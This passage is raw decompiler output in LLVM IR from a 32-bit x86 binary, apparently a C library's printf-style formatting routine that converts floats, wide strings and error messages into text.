  %v1_8050f5f = add i32 %v2_8050f23, 128
  store i32 %v1_8050f5f, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8050f65

dec_label_pc_8050f65:                             ; preds = %dec_label_pc_8050f51, %dec_label_pc_8050f55, %dec_label_pc_8050f4c, %dec_label_pc_8050f13, %dec_label_pc_8050f45, %dec_label_pc_8050f5f
  %v0_8050f9e = phi i32 [ %v3_8050f2a, %dec_label_pc_8050f51 ], [ 1, %dec_label_pc_8050f55 ], [ %v3_8050f2a, %dec_label_pc_8050f4c ], [ %v3_8050f2a, %dec_label_pc_8050f13 ], [ %v3_8050f2a, %dec_label_pc_8050f45 ], [ %v1_8050f5f, %dec_label_pc_8050f5f ]
  %v1_8050f65 = inttoptr i32 %v0_8050f65 to i8*
  %v2_8050f65 = load i8, i8* %v1_8050f65, align 1
  %v3_8050f65 = add i8 %v2_8050f65, -48
  %v8_8050f65 = icmp eq i8 %v3_8050f65, 0
  %v9_8050f65 = icmp slt i8 %v3_8050f65, 0
  store i1 %v9_8050f65, i1* %sf.global-to-local, align 1
  %v1_8050f68 = icmp eq i1 %v8_8050f65, false
  br i1 %v1_8050f68, label %dec_label_pc_8050f96, label %dec_label_pc_8050f6a

dec_label_pc_8050f6a:                             ; preds = %dec_label_pc_8050f65
  %v0_8050f6a = load i32, i32* @ebp, align 4
  %v1_8050f6a = add i32 %v0_8050f6a, -6
  %v6_8050f6a = sub i32 5, %v0_8050f6a
  %v7_8050f6a = and i32 %v6_8050f6a, %v0_8050f6a
  %v8_8050f6a = icmp slt i32 %v7_8050f6a, 0
  %v10_8050f6a = icmp slt i32 %v1_8050f6a, 0
  store i32 11, i32* %eax.global-to-local, align 4
  %v2_8050f72 = icmp eq i1 %v10_8050f6a, %v8_8050f6a
  %v5_8050f72 = select i1 %v2_8050f72, i32 11, i32 %v0_8050f6a
  store i32 %v5_8050f72, i32* @ebp, align 4
  %v1_8050f75 = add i32 %v0_8050f75, 48
  %v2_8050f75 = inttoptr i32 %v1_8050f75 to i32*
  %v3_8050f75 = load i32, i32* %v2_8050f75, align 4
  %v4_8050f75 = add i32 %v3_8050f75, -1
  %v12_8050f75 = icmp eq i32 %v4_8050f75, 0
  %v13_8050f75 = icmp slt i32 %v4_8050f75, 0
  store i1 %v13_8050f75, i1* %sf.global-to-local, align 1
  %v1_8050f7a = icmp eq i1 %v12_8050f75, false
  br i1 %v1_8050f7a, label %dec_label_pc_8050f8b, label %dec_label_pc_8050f7c

dec_label_pc_8050f7c:                             ; preds = %dec_label_pc_8050f6a
  store i32 5, i32* @esi, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_8060498.708 to i32), i32* @edi, align 4
  br label %dec_label_pc_8051115

dec_label_pc_8050f8b:                             ; preds = %dec_label_pc_8050f6a
  %v1_8050f8b = icmp eq i32 %v0_8050f9e, 0
  %v2_8050f8b = icmp slt i32 %v0_8050f9e, 0
  store i1 %v2_8050f8b, i1* %sf.global-to-local, align 1
  %v1_8050f8d = icmp eq i1 %v1_8050f8b, false
  br i1 %v1_8050f8d, label %dec_label_pc_8050f96, label %dec_label_pc_8050f8f

dec_label_pc_8050f8f:                             ; preds = %dec_label_pc_8050f8b
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_8051115

dec_label_pc_8050f96:                             ; preds = %dec_label_pc_8050f8b, %dec_label_pc_8050f65
  %v2_8050f96 = sub i32 %v0_8050f9e, %v1_8050f25
  %v7_8050f96 = icmp ult i32 %v0_8050f9e, %v1_8050f25
  %v12_8050f96 = icmp eq i32 %v2_8050f96, 0
  %v13_8050f96 = icmp slt i32 %v2_8050f96, 0
  store i1 %v13_8050f96, i1* %sf.global-to-local, align 1
  %v2_8050f98 = or i1 %v7_8050f96, %v12_8050f96
  br i1 %v2_8050f98, label %dec_label_pc_8051115, label %dec_label_pc_8050f9e

dec_label_pc_8050f9e:                             ; preds = %dec_label_pc_8050f96
  store i1 %v13_8050f96, i1* %sf.global-to-local, align 1
  store i32 %v2_8050f96, i32* @ebx, align 4
  br label %dec_label_pc_805112f

dec_label_pc_8050fa7:                             ; preds = %dec_label_pc_8050e3a
  %v1_8050fa7 = add i32 %v3_8050e0c, -15
  %v5_8050fa7 = icmp ult i32 %v3_8050e0c, 15
  %v9_8050fa7 = icmp eq i32 %v1_8050fa7, 0
  %v10_8050fa7 = icmp slt i32 %v1_8050fa7, 0
  store i1 %v10_8050fa7, i1* %sf.global-to-local, align 1
  %v2_8050faa = or i1 %v5_8050fa7, %v9_8050fa7
  br i1 %v2_8050faa, label %dec_label_pc_8050fac, label %dec_label_pc_8050ff1

dec_label_pc_8050fac:                             ; preds = %dec_label_pc_8050fa7
  %v1_8050fac = add i32 %v0_8050e0c.lcssa, 33
  %v2_8050fac = inttoptr i32 %v1_8050fac to i8*
  %v3_8050fac = load i8, i8* %v2_8050fac, align 1
  %v4_8050fac = and i8 %v3_8050fac, 8
  %v5_8050fac = icmp eq i8 %v4_8050fac, 0
  store i1 false, i1* %sf.global-to-local, align 1
  %v1_8050fb1 = add i32 %v0_8050e0c.lcssa, 344
  %v2_8050fb1 = inttoptr i32 %v1_8050fb1 to i32*
  %v3_8050fb1 = load i32, i32* %v2_8050fb1, align 4
  store i32 %v3_8050fb1, i32* %edx.global-to-local, align 4
  br i1 %v5_8050fac, label %dec_label_pc_8050fbe, label %dec_label_pc_8050fba

dec_label_pc_8050fba:                             ; preds = %dec_label_pc_8050fac
  %v1_8050fba = inttoptr i32 %v3_8050fb1 to x86_fp80*
  %v2_8050fba = load x86_fp80, x86_fp80* %v1_8050fba, align 4
  br label %dec_label_pc_8050fc0

dec_label_pc_8050fbe:                             ; preds = %dec_label_pc_8050fac
  %v1_8050fbe = inttoptr i32 %v3_8050fb1 to double*
  %v2_8050fbe = load double, double* %v1_8050fbe, align 4
  %v3_8050fbe = fpext double %v2_8050fbe to x86_fp80
  br label %dec_label_pc_8050fc0

dec_label_pc_8050fc0:                             ; preds = %dec_label_pc_8050fba, %dec_label_pc_8050fbe
  %storemerge5 = phi x86_fp80 [ %v2_8050fba, %dec_label_pc_8050fba ], [ %v3_8050fbe, %dec_label_pc_8050fbe ]
  store x86_fp80 %storemerge5, x86_fp80* %st0.global-to-local, align 4
  %v0_8050fc0 = load i32, i32* @esi, align 4
  %v2_8050fc0 = add i32 %v0_8050e0c.lcssa, -4
  %v3_8050fc0 = inttoptr i32 %v2_8050fc0 to i32*
  store i32 %v0_8050fc0, i32* %v3_8050fc0, align 4
  %v0_8050fc1 = load i32, i32* @esi, align 4
  %v2_8050fc1 = add i32 %v0_8050e0c.lcssa, -8
  %v3_8050fc1 = inttoptr i32 %v2_8050fc1 to i32*
  store i32 %v0_8050fc1, i32* %v3_8050fc1, align 4
  %v1_8050fc2 = add i32 %v0_8050e0c.lcssa, -12
  %v2_8050fc2 = inttoptr i32 %v1_8050fc2 to i32*
  store i32 134548610, i32* %v2_8050fc2, align 4
  %v1_8050fc7 = add i32 %v0_8050e0c.lcssa, 20
  store i32 %v1_8050fc7, i32* %eax.global-to-local, align 4
  %v2_8050fcb = add i32 %v0_8050e0c.lcssa, -16
  %v3_8050fcb = inttoptr i32 %v2_8050fcb to i32*
  store i32 %v1_8050fc7, i32* %v3_8050fcb, align 4
  %v1_8050fcc = add i32 %v0_8050e0c.lcssa, -28
  %v10_8050fcc = icmp slt i32 %v1_8050fcc, 0
  store i1 %v10_8050fcc, i1* %sf.global-to-local, align 1
  %v1_8050fcf = load x86_fp80, x86_fp80* %st0.global-to-local, align 4
  %v3_8050fcf = inttoptr i32 %v1_8050fcc to x86_fp80*
  store x86_fp80 %v1_8050fcf, x86_fp80* %v3_8050fcf, align 4
  %v1_8050fd2 = add i32 %v0_8050e0c.lcssa, 368
  %v2_8050fd2 = inttoptr i32 %v1_8050fd2 to i32*
  %v3_8050fd2 = load i32, i32* %v2_8050fd2, align 4
  %v5_8050fd2 = add i32 %v0_8050e0c.lcssa, -32
  %v6_8050fd2 = inttoptr i32 %v5_8050fd2 to i32*
  store i32 %v3_8050fd2, i32* %v6_8050fd2, align 4
  %v0_8050fd9 = call i32 @_fpmaxtostr()
  store i32 %v0_8050fd9, i32* %eax.global-to-local, align 4
  %v0_8050fde = load i32, i32* @esp, align 4
  %v1_8050fde = add i32 %v0_8050fde, 32
  %v2_8050fe1 = icmp slt i32 %v0_8050fd9, 0
  store i1 %v2_8050fe1, i1* %sf.global-to-local, align 1
  br i1 %v2_8050fe1, label %dec_label_pc_805128f, label %dec_label_pc_8050fe9

dec_label_pc_8050fe9:                             ; preds = %dec_label_pc_8050fc0
  %v1_8050fe9 = inttoptr i32 %v1_8050fde to i32*
  %v2_8050fe9 = load i32, i32* %v1_8050fe9, align 4
  %v4_8050fe9 = add i32 %v2_8050fe9, %v0_8050fd9
  %v15_8050fe9 = icmp slt i32 %v4_8050fe9, 0
  store i1 %v15_8050fe9, i1* %sf.global-to-local, align 1
  store i32 %v4_8050fe9, i32* %v1_8050fe9, align 4
  %v0_805127c.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_805127c

dec_label_pc_8050ff1:                             ; preds = %dec_label_pc_8050fa7
  %v1_8050ff1 = add i32 %v3_8050e0c, -17
  %v5_8050ff1 = icmp ult i32 %v3_8050e0c, 17
  %v9_8050ff1 = icmp eq i32 %v1_8050ff1, 0
  %v10_8050ff1 = icmp slt i32 %v1_8050ff1, 0
  store i1 %v10_8050ff1, i1* %sf.global-to-local, align 1
  %v2_8050ff4 = or i1 %v5_8050ff1, %v9_8050ff1
  br i1 %v2_8050ff4, label %dec_label_pc_8050ffa, label %dec_label_pc_805108e

dec_label_pc_8050ffa:                             ; preds = %dec_label_pc_8050ff1
  %v1_8050ffa = add i32 %v0_8050e0c.lcssa, 332
  %v2_8050ffa = inttoptr i32 %v1_8050ffa to i32*
  store i32 0, i32* %v2_8050ffa, align 4
  %v0_8051005 = load i32, i32* @esp, align 4
  %v1_8051005 = add i32 %v0_8051005, 344
  %v2_8051005 = inttoptr i32 %v1_8051005 to i32*
  %v3_8051005 = load i32, i32* %v2_8051005, align 4
  store i32 %v3_8051005, i32* %edx.global-to-local, align 4
  %v1_805100c = icmp eq i1 %v9_8050ff1, false
  br i1 %v1_805100c, label %dec_label_pc_805105e, label %dec_label_pc_805100e

dec_label_pc_805100e:                             ; preds = %dec_label_pc_8050ffa
  %v1_805100e = inttoptr i32 %v3_8051005 to i32*
  %v2_805100e = load i32, i32* %v1_805100e, align 4
  store i32 %v2_805100e, i32* %eax.global-to-local, align 4
  %v1_8051010 = icmp eq i32 %v2_805100e, 0
  %v2_8051010 = icmp slt i32 %v2_805100e, 0
  store i1 %v2_8051010, i1* %sf.global-to-local, align 1
  %v2_8051012 = add i32 %v0_8051005, 340
  %v3_8051012 = inttoptr i32 %v2_8051012 to i32*
  store i32 %v2_805100e, i32* %v3_8051012, align 4
  br i1 %v1_8051010, label %dec_label_pc_8051119, label %dec_label_pc_805101f

dec_label_pc_805101f:                             ; preds = %dec_label_pc_805100e
  %v0_805101f = load i32, i32* @esp, align 4
  %v1_805101f = add i32 %v0_805101f, 20
  %v2_805101f = inttoptr i32 %v1_805101f to i32*
  %v3_805101f = load i32, i32* %v2_805101f, align 4
  %v1_8051026 = add i32 %v0_805101f, 340
  store i32 %v1_8051026, i32* %ecx.global-to-local, align 4
  %v2_805102d = icmp slt i32 %v3_805101f, 0
  store i1 %v2_805102d, i1* %sf.global-to-local, align 1
  %v1_805102f = icmp eq i1 %v2_805102d, false
  %v4_805102f = select i1 %v1_805102f, i32 %v3_805101f, i32 -1
  store i32 %v4_805102f, i32* %edx.global-to-local, align 4
  %v1_8051032 = add i32 %v0_805101f, 332
  store i32 %v1_8051032, i32* %eax.global-to-local, align 4
  %v2_8051039 = add i32 %v0_805101f, -4
  %v3_8051039 = inttoptr i32 %v2_8051039 to i32*
  store i32 %v1_8051032, i32* %v3_8051039, align 4
  %v0_805103a = load i32, i32* %edx.global-to-local, align 4
  %v2_805103a = add i32 %v0_805101f, -8
  %v3_805103a = inttoptr i32 %v2_805103a to i32*
  store i32 %v0_805103a, i32* %v3_805103a, align 4
  %v0_805103b = load i32, i32* %ecx.global-to-local, align 4
  %v2_805103b = add i32 %v0_805101f, -12
  %v3_805103b = inttoptr i32 %v2_805103b to i32*
  store i32 %v0_805103b, i32* %v3_805103b, align 4
  %v0_805103c = load i32, i32* %ecx.global-to-local, align 4
  %v2_805103c = add i32 %v0_805101f, -16
  %v3_805103c = inttoptr i32 %v2_805103c to i32*
  store i32 %v0_805103c, i32* %v3_805103c, align 4
  %v0_805103d = call i32 @__GI_wcsrtombs()
  store i32 %v0_805103d, i32* %eax.global-to-local, align 4
  %v0_8051042 = load i32, i32* @esp, align 4
  %v1_8051042 = add i32 %v0_8051042, 16
  %v1_8051045 = add i32 %v0_805103d, 1
  %v10_8051045 = icmp eq i32 %v1_8051045, 0
  %v11_8051045 = icmp slt i32 %v1_8051045, 0
  store i1 %v11_8051045, i1* %sf.global-to-local, align 1
  store i32 %v0_805103d, i32* @esi, align 4
  br i1 %v10_8051045, label %dec_label_pc_805128f, label %dec_label_pc_8051050

dec_label_pc_8051050:                             ; preds = %dec_label_pc_805101f
  store i32 0, i32* @ebx, align 4
  store i32 11, i32* @ebp, align 4
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* @edi, align 4
  br label %dec_label_pc_805112a

dec_label_pc_805105e:                             ; preds = %dec_label_pc_8050ffa
  %v0_805105e = load i32, i32* @ebx, align 4
  %v2_805105e = add i32 %v0_8051005, -4
  %v3_805105e = inttoptr i32 %v2_805105e to i32*
  store i32 %v0_805105e, i32* %v3_805105e, align 4
  %v1_805105f = add i32 %v0_8051005, 332
  store i32 %v1_805105f, i32* %eax.global-to-local, align 4
  %v2_8051066 = add i32 %v0_8051005, -8
  %v3_8051066 = inttoptr i32 %v2_8051066 to i32*
  store i32 %v1_805105f, i32* %v3_8051066, align 4
  %v0_8051067 = load i32, i32* %edx.global-to-local, align 4
  %v1_8051067 = inttoptr i32 %v0_8051067 to i32*
  %v2_8051067 = load i32, i32* %v1_8051067, align 4
  %v4_8051067 = add i32 %v0_8051005, -12
  %v5_8051067 = inttoptr i32 %v4_8051067 to i32*
  store i32 %v2_8051067, i32* %v5_8051067, align 4
  %v1_8051069 = add i32 %v0_8051005, 204
  store i32 %v1_8051069, i32* @edi, align 4
  %v2_8051070 = add i32 %v0_8051005, -16
  %v3_8051070 = inttoptr i32 %v2_8051070 to i32*
  store i32 %v1_8051069, i32* %v3_8051070, align 4
  %v0_8051071 = call i32 @__GI_wcrtomb()
  store i32 %v0_8051071, i32* %eax.global-to-local, align 4
  %v0_8051076 = load i32, i32* @esp, align 4
  %v1_8051076 = add i32 %v0_8051076, 16
  %v1_8051079 = add i32 %v0_8051071, 1
  %v10_8051079 = icmp eq i32 %v1_8051079, 0
  %v11_8051079 = icmp slt i32 %v1_8051079, 0
  store i1 %v11_8051079, i1* %sf.global-to-local, align 1
  store i32 %v0_8051071, i32* @esi, align 4
  br i1 %v10_8051079, label %dec_label_pc_805128f, label %dec_label_pc_8051084

dec_label_pc_8051084:                             ; preds = %dec_label_pc_805105e
  %v2_8051084 = add i32 %v0_8051071, 220
  %v3_8051084 = add i32 %v2_8051084, %v0_8051076
  %v4_8051084 = inttoptr i32 %v3_8051084 to i8*
  store i8 0, i8* %v4_8051084, align 1
  br label %dec_label_pc_80510bc

dec_label_pc_805108e:                             ; preds = %dec_label_pc_8050ff1
  %v1_805108e = add i32 %v3_8050e0c, -19
  %v5_805108e = icmp ult i32 %v3_8050e0c, 19
  %v9_805108e = icmp eq i32 %v1_805108e, 0
  %v10_805108e = icmp slt i32 %v1_805108e, 0
  store i1 %v10_805108e, i1* %sf.global-to-local, align 1
  %v2_8051091 = or i1 %v5_805108e, %v9_805108e
  br i1 %v2_8051091, label %dec_label_pc_8051093, label %dec_label_pc_80510eb

dec_label_pc_8051093:                             ; preds = %dec_label_pc_805108e
  %v1_8051093 = add i32 %v0_8050e0c.lcssa, 344
  %v2_8051093 = inttoptr i32 %v1_8051093 to i32*
  %v3_8051093 = load i32, i32* %v2_8051093, align 4
  store i32 %v3_8051093, i32* %edx.global-to-local, align 4
  %v1_805109a = icmp eq i1 %v9_805108e, false
  %v1_80510c5 = inttoptr i32 %v3_8051093 to i32*
  %v2_80510c5 = load i32, i32* %v1_80510c5, align 4
  br i1 %v1_805109a, label %dec_label_pc_80510c5, label %dec_label_pc_805109c

dec_label_pc_805109c:                             ; preds = %dec_label_pc_8051093
  store i32 %v2_80510c5, i32* @edi, align 4
  %v1_805109e = icmp eq i32 %v2_80510c5, 0
  %v2_805109e = icmp slt i32 %v2_80510c5, 0
  store i1 %v2_805109e, i1* %sf.global-to-local, align 1
  br i1 %v1_805109e, label %dec_label_pc_8051119, label %dec_label_pc_80510a2

dec_label_pc_80510a2:                             ; preds = %dec_label_pc_805109c, %dec_label_pc_80510f4
  %v1_80510a9 = phi i32 [ %v0_8050e0c.lcssa, %dec_label_pc_805109c ], [ %v1_805110e, %dec_label_pc_80510f4 ]
  %v1_80510a2 = add i32 %v1_80510a9, 20
  %v2_80510a2 = inttoptr i32 %v1_80510a2 to i32*
  %v3_80510a2 = load i32, i32* %v2_80510a2, align 4
  store i32 %v3_80510a2, i32* %edx.global-to-local, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  %v2_80510a9 = add i32 %v1_80510a9, -4
  %v3_80510a9 = inttoptr i32 %v2_80510a9 to i32*
  store i32 %v3_8050e0c, i32* %v3_80510a9, align 4
  %v2_80510aa = add i32 %v1_80510a9, -8
  %v3_80510aa = inttoptr i32 %v2_80510aa to i32*
  store i32 %v3_8050e0c, i32* %v3_80510aa, align 4
  %v2_80510ab = icmp slt i32 %v3_80510a2, 0
  store i1 %v2_80510ab, i1* %sf.global-to-local, align 1
  %v1_80510ad = icmp eq i1 %v2_80510ab, false
  %v2_80510ad = load i32, i32* %eax.global-to-local, align 4
  %v4_80510ad = select i1 %v1_80510ad, i32 %v3_80510a2, i32 %v2_80510ad
  store i32 %v4_80510ad, i32* %eax.global-to-local, align 4
  %v2_80510b0 = add i32 %v1_80510a9, -12
  %v3_80510b0 = inttoptr i32 %v2_80510b0 to i32*
  store i32 %v4_80510ad, i32* %v3_80510b0, align 4
  %v0_80510b1 = load i32, i32* @edi, align 4
  %v2_80510b1 = add i32 %v1_80510a9, -16
  %v3_80510b1 = inttoptr i32 %v2_80510b1 to i32*
  store i32 %v0_80510b1, i32* %v3_80510b1, align 4
  %v0_80510b2 = call i32 @strnlen()
  store i32 %v0_80510b2, i32* %eax.global-to-local, align 4
  %v0_80510b7 = load i32, i32* @esp, align 4
  %v1_80510b7 = add i32 %v0_80510b7, 16
  %v7_80510b7 = icmp slt i32 %v1_80510b7, 0
  store i1 %v7_80510b7, i1* %sf.global-to-local, align 1
  store i32 %v0_80510b2, i32* @esi, align 4
  br label %dec_label_pc_80510bc

dec_label_pc_80510bc:                             ; preds = %dec_label_pc_8051084, %dec_label_pc_80510a2
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* @ebx, align 4
  store i32 11, i32* @ebp, align 4
  br label %dec_label_pc_805112a

dec_label_pc_80510c5:                             ; preds = %dec_label_pc_8051093
  store i32 %v2_80510c5, i32* %eax.global-to-local, align 4
  store i32 1, i32* @esi, align 4
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* @ebx, align 4
  store i32 11, i32* @ebp, align 4
  %v1_80510d3 = add i32 %v0_8050e0c.lcssa, 204
  store i32 %v1_80510d3, i32* @edi, align 4
  %v1_80510da = add i32 %v0_8050e0c.lcssa, 205
  %v2_80510da = inttoptr i32 %v1_80510da to i8*
  store i8 0, i8* %v2_80510da, align 1
  %v0_80510e2 = load i32, i32* %eax.global-to-local, align 4
  %v1_80510e2 = trunc i32 %v0_80510e2 to i8
  %v2_80510e2 = load i32, i32* @esp, align 4
  %v3_80510e2 = add i32 %v2_80510e2, 204
  %v4_80510e2 = inttoptr i32 %v3_80510e2 to i8*
  store i8 %v1_80510e2, i8* %v4_80510e2, align 1
  br label %dec_label_pc_805112a

dec_label_pc_80510eb:                             ; preds = %dec_label_pc_805108e
  %v1_80510eb = add i32 %v3_8050e0c, -20
  %v9_80510eb = icmp eq i32 %v1_80510eb, 0
  %v10_80510eb = icmp slt i32 %v1_80510eb, 0
  store i1 %v10_80510eb, i1* %sf.global-to-local, align 1
  %v1_80510ee = icmp eq i1 %v9_80510eb, false
  br i1 %v1_80510ee, label %dec_label_pc_805128f, label %dec_label_pc_80510f4

dec_label_pc_80510f4:                             ; preds = %dec_label_pc_80510eb
  %v0_80510f4 = load i32, i32* %stack_var_-364, align 4
  %v1_80510f4 = call i32 @__errno_location(i32 %v0_80510f4)
  store i32 %v1_80510f4, i32* %eax.global-to-local, align 4
  %v0_80510f9 = load i32, i32* %edx.global-to-local, align 4
  %v1_80510f9 = load i32, i32* @esp, align 4
  %v2_80510f9 = add i32 %v1_80510f9, -4
  %v3_80510f9 = inttoptr i32 %v2_80510f9 to i32*
  store i32 %v0_80510f9, i32* %v3_80510f9, align 4
  %v1_80510fa = add i32 %v1_80510f9, -8
  %v2_80510fa = inttoptr i32 %v1_80510fa to i32*
  store i32 128, i32* %v2_80510fa, align 4
  %v1_80510ff = add i32 %v1_80510f9, 204
  store i32 %v1_80510ff, i32* %edx.global-to-local, align 4
  %v2_8051106 = add i32 %v1_80510f9, -12
  %v3_8051106 = inttoptr i32 %v2_8051106 to i32*
  store i32 %v1_80510ff, i32* %v3_8051106, align 4
  %v1_8051107 = inttoptr i32 %v1_80510f4 to i32*
  %v2_8051107 = load i32, i32* %v1_8051107, align 4
  %v4_8051107 = add i32 %v1_80510f9, -16
  %v5_8051107 = inttoptr i32 %v4_8051107 to i32*
  store i32 %v2_8051107, i32* %v5_8051107, align 4
  %v0_8051109 = call i32 @__GI___glibc_strerror_r()
  store i32 %v0_8051109, i32* %eax.global-to-local, align 4
  %v0_805110e = load i32, i32* @esp, align 4
  %v1_805110e = add i32 %v0_805110e, 16
  %v7_805110e = icmp slt i32 %v1_805110e, 0
  store i1 %v7_805110e, i1* %sf.global-to-local, align 1
  store i32 %v0_8051109, i32* @edi, align 4
  br label %dec_label_pc_80510a2

dec_label_pc_8051115:                             ; preds = %dec_label_pc_8050f96, %dec_label_pc_8050f8f, %dec_label_pc_8050f7c
  %v0_805113235 = phi i32 [ %v1_8050f25, %dec_label_pc_8050f96 ], [ 0, %dec_label_pc_8050f8f ], [ 5, %dec_label_pc_8050f7c ]
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_805112f

dec_label_pc_8051119:                             ; preds = %dec_label_pc_805109c, %dec_label_pc_805100e
  store i32 6, i32* @esi, align 4
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* @ebx, align 4
  store i32 11, i32* @ebp, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_806049e.709 to i32), i32* @edi, align 4
  br label %dec_label_pc_805112a

dec_label_pc_805112a:                             ; preds = %dec_label_pc_80510c5, %dec_label_pc_80510bc, %dec_label_pc_8051050, %dec_label_pc_8051119
  %v0_805112a = load i32, i32* @esp, align 4
  %v1_805112a = add i32 %v0_805112a, 7
  %v2_805112a = inttoptr i32 %v1_805112a to i8*
  store i8 32, i8* %v2_805112a, align 1
  %v0_8051132.pre = load i32, i32* @esi, align 4
  %v1_8051132.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_805112f

dec_label_pc_805112f:                             ; preds = %dec_label_pc_8051115, %dec_label_pc_8050f9e, %dec_label_pc_805112a
  %v1_8051132 = phi i32 [ 0, %dec_label_pc_8051115 ], [ %v2_8050f96, %dec_label_pc_8050f9e ], [ %v1_8051132.pre, %dec_label_pc_805112a ]
  %v0_8051132 = phi i32 [ %v0_805113235, %dec_label_pc_8051115 ], [ %v1_8050f25, %dec_label_pc_8050f9e ], [ %v0_8051132.pre, %dec_label_pc_805112a ]
  %v0_805112f = load i32, i32* @ebp, align 4
  %v1_805112f = add i32 %v0_805112f, -11
  %v9_805112f = icmp eq i32 %v1_805112f, 0
  %v10_805112f = icmp slt i32 %v1_805112f, 0
  store i1 %v10_805112f, i1* %sf.global-to-local, align 1
  %v2_8051132 = add i32 %v0_8051132, %v1_8051132
  store i32 %v2_8051132, i32* @edx, align 4
  br i1 %v9_805112f, label %dec_label_pc_8051143, label %dec_label_pc_8051137

dec_label_pc_8051137:                             ; preds = %dec_label_pc_805112f
  %v1_8051139 = add i32 %v0_805112f, -5
  %v6_8051139 = sub i32 4, %v0_805112f
  %v7_8051139 = and i32 %v6_8051139, %v0_805112f
  %v8_8051139 = icmp slt i32 %v7_8051139, 0
  %v9_8051139 = icmp eq i32 %v1_8051139, 0
  %v10_8051139 = icmp slt i32 %v1_8051139, 0
  store i1 %v10_8051139, i1* %sf.global-to-local, align 1
  %v3_805113c = icmp eq i1 %v10_8051139, %v8_8051139
  %v4_805113c = icmp eq i1 %v9_8051139, false
  %v5_805113c = and i1 %v4_805113c, %v3_805113c
  %v6_805113c = zext i1 %v5_805113c to i32
  store i32 %v6_805113c, i32* %eax.global-to-local, align 4
  %v2_805113f = add i32 %v2_8051132, 1
  %v3_805113f = add i32 %v2_805113f, %v6_805113c
  store i32 %v3_805113f, i32* @edx, align 4
  br label %dec_label_pc_8051143

dec_label_pc_8051143:                             ; preds = %dec_label_pc_805112f, %dec_label_pc_8051137
  %v0_8051143 = load i32, i32* @esp, align 4
  %v1_8051143 = add i32 %v0_8051143, 24
  %v2_8051143 = inttoptr i32 %v1_8051143 to i32*
  %v3_8051143 = load i32, i32* %v2_8051143, align 4
  store i32 %v3_8051143, i32* %eax.global-to-local, align 4
  %v1_8051147 = add i32 %v0_8051143, 8
  %v2_8051147 = inttoptr i32 %v1_8051147 to i32*
  store i32 0, i32* %v2_8051147, align 4
  %v0_805114f = load i32, i32* %eax.global-to-local, align 4
  %v1_805114f = load i32, i32* @edx, align 4
  %v2_805114f = sub i32 %v0_805114f, %v1_805114f
  %v7_805114f = icmp ult i32 %v0_805114f, %v1_805114f
  %v12_805114f = icmp eq i32 %v2_805114f, 0
  %v13_805114f = icmp slt i32 %v2_805114f, 0
  store i1 %v13_805114f, i1* %sf.global-to-local, align 1
  %v2_8051151 = or i1 %v7_805114f, %v12_805114f
  br i1 %v2_8051151, label %dec_label_pc_8051159, label %dec_label_pc_8051153

dec_label_pc_8051153:                             ; preds = %dec_label_pc_8051143
  store i1 %v13_805114f, i1* %sf.global-to-local, align 1
  store i32 %v2_805114f, i32* %eax.global-to-local, align 4
  %v1_8051155 = load i32, i32* @esp, align 4
  %v2_8051155 = add i32 %v1_8051155, 8
  %v3_8051155 = inttoptr i32 %v2_8051155 to i32*
  store i32 %v2_805114f, i32* %v3_8051155, align 4
  %v0_805115d.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8051159

dec_label_pc_8051159:                             ; preds = %dec_label_pc_8051143, %dec_label_pc_8051153
  %v0_805115d = phi i32 [ %v1_805114f, %dec_label_pc_8051143 ], [ %v0_805115d.pre, %dec_label_pc_8051153 ]
  %v0_8051159 = load i32, i32* @esp, align 4
  %v1_8051159 = add i32 %v0_8051159, 8
  %v2_8051159 = inttoptr i32 %v1_8051159 to i32*
  %v3_8051159 = load i32, i32* %v2_8051159, align 4
  store i32 %v3_8051159, i32* @ecx, align 4
  %v2_805115d = add i32 %v3_8051159, %v0_805115d
  store i32 %v2_805115d, i32* %eax.global-to-local, align 4
  %v1_8051160 = inttoptr i32 %v0_8051159 to i32*
  %v2_8051160 = load i32, i32* %v1_8051160, align 4
  %v4_8051160 = add i32 %v2_8051160, %v2_805115d
  %v15_8051160 = icmp slt i32 %v4_8051160, 0
  store i1 %v15_8051160, i1* %sf.global-to-local, align 1
  store i32 %v4_8051160, i32* %v1_8051160, align 4
  %v0_8051163 = load i32, i32* @esp, align 4
  %v1_8051163 = add i32 %v0_8051163, 7
  %v2_8051163 = inttoptr i32 %v1_8051163 to i8*
  %v3_8051163 = load i8, i8* %v2_8051163, align 1
  %v4_8051163 = add i8 %v3_8051163, -48
  %v9_8051163 = icmp eq i8 %v4_8051163, 0
  %v10_8051163 = icmp slt i8 %v4_8051163, 0
  store i1 %v10_8051163, i1* %sf.global-to-local, align 1
  %v1_8051168 = icmp eq i1 %v9_8051163, false
  br i1 %v1_8051168, label %dec_label_pc_8051174, label %dec_label_pc_805116a

dec_label_pc_805116a:                             ; preds = %dec_label_pc_8051159
  %v0_805116a = load i32, i32* @ebx, align 4
  %v1_805116a = load i32, i32* @ecx, align 4
  %v2_805116a = add i32 %v1_805116a, %v0_805116a
  %v13_805116a = icmp slt i32 %v2_805116a, 0
  store i1 %v13_805116a, i1* %sf.global-to-local, align 1
  store i32 %v2_805116a, i32* @ebx, align 4
  %v1_805116c = add i32 %v0_8051163, 8
  %v2_805116c = inttoptr i32 %v1_805116c to i32*
  store i32 0, i32* %v2_805116c, align 4
  %v0_8051174.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8051174

dec_label_pc_8051174:                             ; preds = %dec_label_pc_8051159, %dec_label_pc_805116a
  %v0_805117b = phi i32 [ %v0_8051163, %dec_label_pc_8051159 ], [ %v0_8051174.pre, %dec_label_pc_805116a ]
  %v1_8051174 = add i32 %v0_805117b, 32
  %v2_8051174 = inttoptr i32 %v1_8051174 to i8*
  %v3_8051174 = load i8, i8* %v2_8051174, align 1
  %v4_8051174 = and i8 %v3_8051174, 8
  %v5_8051174 = icmp eq i8 %v4_8051174, 0
  store i1 false, i1* %sf.global-to-local, align 1
